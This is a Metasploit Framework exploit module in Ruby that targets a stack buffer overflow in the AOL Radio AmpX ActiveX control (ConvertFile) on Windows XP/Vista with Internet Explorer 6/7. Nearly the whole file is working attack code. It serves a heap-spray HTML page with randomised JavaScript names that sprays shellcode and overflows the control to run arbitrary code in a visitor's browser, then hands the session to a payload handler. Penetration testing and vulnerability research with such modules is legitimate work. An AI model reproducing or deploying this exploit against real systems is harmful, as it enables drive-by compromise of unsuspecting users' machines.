##
# $Id: aol_ampx_convertfile.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'AOL Radio AmpX ActiveX Control ConvertFile() Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in AOL IWinAmpActiveX
				class (AmpX.dll) version 2.4.0.6 installed via AOL Radio website.
				By setting an overly long value to 'ConvertFile()', an attacker can overrun
				a buffer and execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'rgod <rgod[at]autistici.org>',		# Original exploit [see References]
					'Trancer <mtrancer[at]gmail.com>'	# Metasploit implementation
				],
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'OSVDB', '54706' ],
					[ 'BID', '35028' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/8733' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP3 / Windows Vista SP0-SP1 / IE 6.0 SP0-2 & IE 7.0', { 'Offset' => 250, 'Ret' => 0x0C0C0C0C } ]
				],
			'DisclosureDate' => 'May 19 2009',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Setup exploit buffers
		nops 	  = Rex::Text.to_unescape([target.ret].pack('V'))
		ret  	  = Rex::Text.uri_encode([target.ret].pack('L'))
		blocksize = 0x40000
		fillto    = 500
		offset 	  = target['Offset']

		# Randomize the javascript variable names
		ampx	     = rand_text_alpha(rand(100) + 1)
		j_shellcode  = rand_text_alpha(rand(100) + 1)
		j_nops       = rand_text_alpha(rand(100) + 1)
		j_headersize = rand_text_alpha(rand(100) + 1)
		j_slackspace = rand_text_alpha(rand(100) + 1)
		j_fillblock  = rand_text_alpha(rand(100) + 1)
		j_block      = rand_text_alpha(rand(100) + 1)
		j_memory     = rand_text_alpha(rand(100) + 1)
		j_counter    = rand_text_alpha(rand(30) + 2)
		j_ret        = rand_text_alpha(rand(100) + 1)
		j_eax        = rand_text_alpha(rand(100) + 1)
		j_bof        = rand_text_alpha(rand(100) + 1)

		# Build out the message
		content = %Q|
<html>
<OBJECT classid='clsid:FE0BD779-44EE-4A4B-AA2E-743C63F2E5E6' id='#{ampx}'></OBJECT>
<script language='javascript'>
	#{j_shellcode}=unescape('#{shellcode}');
	#{j_nops}=unescape('#{nops}');
	#{j_headersize}=20;
	#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;
	while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};
	#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});
	#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});
	while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};
	#{j_memory}=new Array();
	for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};
	#{j_eax}='';
	for(#{j_counter}=0;#{j_counter}<=350;#{j_counter}++)#{j_eax}+=unescape('%FF%FF%FF%FF');
	#{j_ret}='';
	for(#{j_counter}=0;#{j_counter}<=#{offset};#{j_counter}++)#{j_ret}+=unescape('#{ret}');
	#{j_bof}=#{j_eax}+#{j_ret};
	#{ampx}.ConvertFile(#{j_bof},1,1,1,1,1);
	#{ampx}.ConvertFile(#{j_bof},1,1,1,1,1);
	#{ampx}.ConvertFile(#{j_bof},1,1,1,1,1);
	#{ampx}.ConvertFile(#{j_bof},1,1,1,1,1);
</script>
</html>
			|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end